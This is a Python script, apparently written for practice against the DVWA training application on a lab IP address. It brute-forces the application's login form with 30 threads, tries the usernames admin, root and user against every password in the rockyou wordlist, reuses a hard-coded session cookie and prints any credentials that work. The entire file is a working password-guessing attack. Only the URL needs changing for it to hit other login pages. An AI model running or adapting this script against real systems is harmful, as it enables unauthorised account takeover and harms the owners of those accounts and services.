#!/usr/bin/env python3
import requests
import threading
import queue

# this might be different for you
URL = 'http://10.0.2.6/dvwa/vulnerabilities/brute/'

users = ['admin', 'root', 'user']
# the path might be different for you
f = open('/usr/share/wordlists/rockyou.txt', 'rb')
passwords = f.readlines()
f.close()

q = queue.Queue()

cookies = {
	# change this session id
	'PHPSESSID':'e925272e64f4fab4a4fcb29425c3e4b3',
	'security':'low'
}

def worker_thread(q):
	while q.qsize() > 0:
		username, password = q.get()
		username, password = username.strip(), password.strip().decode('latin-1')
		test_login(username, password)

def test_login(username, password):
	payload = f'?username={username}&password={password}&Login=Login'
	req = requests.get(URL + payload, cookies=cookies)
	if not 'incorrect' in req.text:
		print (f"Valid credentials: {username}:{password}")
		return True
	return False


def start_threads(num_threads):
	global threads
	threads = []
	for _ in range(num_threads):
		threads.append(threading.Thread(target=worker_thread, args=(q,)))
		threads[-1].start()
	global threads_started
	threads_started = True



threads_started = False
for user in users:
	for password in passwords:
		q.put((user, password))
		if q.qsize() > 1000 and not threads_started:
			start_threads(30)
			print('Threads started')
